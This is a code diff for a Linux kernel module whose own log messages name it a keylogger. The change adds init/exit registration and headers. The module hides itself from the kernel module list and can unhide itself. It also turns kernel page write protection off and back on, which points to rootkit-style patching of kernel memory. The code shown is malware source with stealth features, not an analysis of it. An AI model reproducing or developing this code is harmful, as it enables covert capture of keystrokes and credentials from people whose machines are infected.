@@ -1,17 +1,19 @@
-#include <linux/init.h>
 #include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
 #include <linux/proc_fs.h>
 #include <linux/string.h>
 #include <linux/cred.h>
 #include <linux/fs.h>
 #include <linux/sched.h>
 #include <asm/page.h>
+#include <linux/sysfs.h>
 
 #include "sysmap.h"
 
 
 static struct list_head *module_previous;
-//static struct list_head *module_kobj_previous;
+static struct list_head *module_kobj_previous;
 static int  hidden = 0;
 //static char buff[10];
 static int state = 0;
@@ -108,10 +110,9 @@ void module_hide(void)
 	if (hidden) return;
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-	
-	/*module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	list_del(&THIS_MODULE->mkobj.kobj.entry);*/
+//	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+//	kobject_del(&THIS_MODULE->mkobj.kobj);
+//	list_del(&THIS_MODULE->mkobj.kobj.entry);
 	
 	hidden = !hidden;
 }
@@ -119,15 +120,17 @@ void module_hide(void)
 void module_show(void)
 {
 	printk("I'm now unhiding module %s\n",THIS_MODULE->name);
-	//int result;
+	int result;
 	if (!hidden) return;
 	list_add(&THIS_MODULE->list, module_previous);
-	//result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
+//	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
+//	list_add(&THIS_MODULE->mkobj.kobj.entry,module_kobj_previous);
+	
 	hidden = !hidden;
 }
 
 
-int init_module(void)
+static int __init hidemodule_init(void)
 {
 	printk("Loaded the module but its hidden\n");
 	printk(KERN_INFO "Loading keylogger LKM...\n");
@@ -154,7 +157,7 @@ int init_module(void)
 	return 0;
 }
 
-void exit_module(void)
+static void __exit hidemodule_exit(void)
 {
 	printk(KERN_INFO "Unloading keylogger... bye!\n");
 
@@ -167,4 +170,7 @@ void exit_module(void)
         /* reenable the write-protection */
         enable_page_protection();
 }
+
+module_init(hidemodule_init);
+module_exit(hidemodule_exit);
 
